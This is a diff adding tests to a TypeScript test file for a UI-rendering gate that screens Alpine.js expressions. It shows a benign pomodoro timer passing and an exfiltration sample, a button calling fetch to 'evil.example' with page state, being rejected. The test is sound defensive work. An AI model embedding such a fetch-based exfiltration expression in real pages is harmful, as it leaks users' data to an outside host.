@@ -64,3 +64,30 @@ describe("render_ui — the deterministic UI gate at the chokepoint", () => {
     expect(JSON.stringify(outcome.result)).toContain("HtmlTooLarge")
   })
 })
+
+describe("render_ui — Alpine at the chokepoint", () => {
+  test("a pomodoro page with Alpine directives passes and reaches the sink", async () => {
+    const { outcome, rendered } = await Effect.runPromise(
+      call({
+        id: "pomodoro",
+        title: "Pomodoro",
+        html: `<div class="cv-page" x-data="{left:1500,on:false}" x-init="setInterval(() => { if (on && left > 0) left-- }, 1000)"><div class="cv-stat"><span class="cv-stat-value" x-text="Math.floor(left/60)+':'+String(left%60).padStart(2,'0')">25:00</span><span class="cv-stat-label">remaining</span></div><button class="cv-btn" @click="on=!on">start / pause</button></div>`,
+      }),
+    )
+    expect(outcome.isFailure).toBe(false)
+    expect(rendered).toHaveLength(1)
+  })
+
+  test("a foreign-API expression bounces with the alpine-expr finding", async () => {
+    const { outcome, rendered } = await Effect.runPromise(
+      call({
+        id: "exfil",
+        title: "Exfil",
+        html: `<button @click="fetch('https://evil.example/?d='+state)">send</button>`,
+      }),
+    )
+    expect(outcome.isFailure).toBe(true)
+    expect(JSON.stringify(outcome.result)).toContain("alpine-expr")
+    expect(rendered).toHaveLength(0)
+  })
+})
